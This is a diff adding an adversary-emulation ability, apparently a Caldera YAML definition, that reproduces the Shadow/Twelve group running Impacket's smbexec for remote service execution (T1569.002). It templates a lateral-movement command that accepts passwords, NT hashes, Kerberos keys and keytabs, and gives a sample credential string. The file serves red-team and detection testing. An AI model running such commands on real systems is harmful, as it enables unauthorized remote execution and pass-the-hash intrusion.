@@ -1,0 +1,73 @@
+- id: 612b6cfa-4ebe-4e50-bb1f-9feff9f4aaaq
+  name: "[SHADOW-TWELVE] SMBExec from Impacket execution"
+  description: "Shadow используют утилиты PsExec из пакета Sysinternals и smbexec ( smbexec.exe ) из фреймворка Impacket для выполнения различных команд, сценариев и исполняемых файлов"
+  tactic: execution
+  technique:
+    attack_id: T1569.002
+    name: "System Services: Service Execution"
+  platforms:
+    windows:
+      psh:
+        command: |
+          .\smbexec.exe "#{auth_string}" "#{command}" #{hashes} #{aes_key} #{dc_ip} #{session_id} #{ts} #{silent} #{debug} #{codec} #{keytab}
+        timeout: 120
+        payloads:
+          - smbexec.exe
+
+    # darwin,linux:
+    #   sh:
+    #     command: |
+    #       chmod +x ./smbexec;
+    #       ./smbexec "#{auth_string}" "#{command}" #{hashes} #{aes_key} #{dc_ip} #{session_id} #{ts} #{silent} #{debug} #{codec} #{keytab}
+    #     timeout: 120
+    #     payloads:
+    #       - smbexec
+  variables:
+    - key: auth_string
+      description: |
+        Authentication target in format:
+        [domain/]username[:password]@target_ip
+        Example: corp/admin:P@ssw0rd@192.168.1.10
+      validation: ^([\w\.-]+/)?[\w\.-]+(:[^@]*)?@[\w\.-]+$
+
+    - key: command
+      description: "Command to execute"
+      value: "whoami"
+
+    - key: hashes
+      description: "LM:NT hashes (optional)"
+      validation: ^([a-fA-F0-9]{32}:[a-fA-F0-9]{32})?$
+
+    - key: aes_key
+      description: "AES Kerberos key (hex, optional)"
+      validation: ^[a-fA-F0-9]{32,64}?$
+
+    - key: dc_ip
+      description: "Domain Controller IP (optional)"
+      validation: ^\d{1,3}(\.\d{1,3}){3}?$
+
+    - key: session_id
+      description: "Existing logon session ID (optional)"
+      validation: ^\d*$
+
+    - key: ts
+      description: "Add timestamp (true/false)"
+      value: "false"
+      validation: ^(true|false)$
+
+    - key: silent
+      description: "Silent mode (true/false)"
+      value: "false"
+      validation: ^(true|false)$
+
+    - key: debug
+      description: "Debug mode (true/false)"
+      value: "false"
+      validation: ^(true|false)$
+
+    - key: codec
+      description: "Output encoding (e.g., cp866)"
+      value: "utf-8"
+
+    - key: keytab
+      description: "Kerberos keytab file (optional)"
